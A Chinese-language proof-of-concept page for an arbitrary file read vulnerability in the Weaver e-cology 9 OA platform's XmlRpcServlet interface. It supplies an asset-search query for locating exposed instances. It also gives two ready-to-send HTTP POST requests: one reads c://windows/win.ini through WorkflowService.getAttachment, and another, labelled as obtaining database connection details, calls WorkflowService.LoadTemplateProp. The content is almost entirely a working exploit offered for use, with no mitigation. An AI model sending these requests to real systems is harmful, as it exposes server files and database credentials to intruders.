# 泛微e-cology9接口XmlRpcServlet存在任意文件读取漏洞

泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。泛微e-cology XmlRpcServlet存在任意文件读取漏洞，攻击者可通过该漏洞获取敏感信息

## hunter

```yaml
app.name=="泛微 e-cology 9.0 OA"
```

## poc

```yaml
POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/xml
Accept-Encoding: gzip
Content-Length: 201
 
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>WorkflowService.getAttachment</methodName>
<params>
<param>
<value><string>c://windows/win.ini</string></value>
</param>
</params>
</methodCall>
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407171252023.png)

### 获取数据库连接信息

```yaml
POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/xml
Accept-Encoding: gzip
Content-Length: 201
 
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>WorkflowService.LoadTemplateProp</methodName>
<params>
<param>
<value><string>weaver</string></value>
</param>
</params>
</methodCall>
```

